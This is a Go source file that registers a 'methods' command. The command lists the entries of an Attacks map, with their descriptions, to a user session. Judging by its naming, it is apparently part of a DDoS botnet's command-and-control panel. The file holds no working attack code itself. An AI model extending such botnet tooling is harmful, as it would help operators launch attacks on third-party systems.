package commands

import (
	"bytes"
	"hajime/source"
	"hajime/source/masters/sessions"
)

func init() {
	Register(&Command{
		Name:        "methods",
		Description: "list all methods",
		Execute: func(session *sessions.Session, _ []string) error {
			buf := bytes.NewBuffer(make([]byte, 0))
			for name, method := range source.Attacks {
				payload, err := session.ExecuteBrandingToString(map[string]any{"method": name, "description": method.Description}, "resources", "branding", "method.tfx")
				if err != nil {
					return err
				}

				buf.WriteString(payload)
			}

			_, err := buf.WriteTo(session.Term)
			return err
		},
	})
}